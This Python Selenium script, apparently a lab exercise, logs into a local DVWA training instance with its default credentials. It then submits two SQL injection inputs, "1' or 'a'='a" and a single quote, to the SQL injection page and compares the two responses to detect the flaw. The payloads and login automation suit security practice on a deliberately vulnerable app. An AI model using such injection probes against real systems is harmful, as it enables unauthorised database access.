# https://techacademy.jp/magazine/28392

# coding:utf-8
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from difflib import SequenceMatcher

# ブラウザを開く。
options = webdriver.ChromeOptions()
driver = webdriver.Chrome(executable_path="../yuu/login/chromedriver", chrome_options = options)
# Googleの検索TOP画面を開く。
driver.get("http://192.168.56.103/dvwa/login.php")
# 2秒待機
time.sleep(1)
# ユーザーネームを入力
login_id = driver.find_element_by_name("username")
login_id.send_keys("admin")
# パスワードを入力
password = driver.find_element_by_name("password")
password.send_keys("password")
#ログインボタンをクリック
login_btn = driver.find_element_by_name("Login")
login_btn.click()
# 2秒待機
time.sleep(1)

driver.get("http://192.168.56.103/dvwa/vulnerabilities/sqli/")

# IDを入力
text = driver.find_element_by_name("id")
text.send_keys("1' or 'a'='a")
# 2秒待機
time.sleep(1)
#ボタンをクリック
submit_btn = driver.find_element_by_name("Submit")
submit_btn.click()
time.sleep(1)
dp1 = driver.page_source

# IDを入力
text = driver.find_element_by_name("id")
text.send_keys("'")
# 2秒待機
time.sleep(1)
#ボタンをクリック
submit_btn = driver.find_element_by_name("Submit")
submit_btn.click()
time.sleep(1)
dp2 = driver.page_source

#待機
time.sleep(2)
# ブラウザを終了する。
driver.close()

#比較
s = SequenceMatcher(None, dp1, dp2)
print(s.ratio())
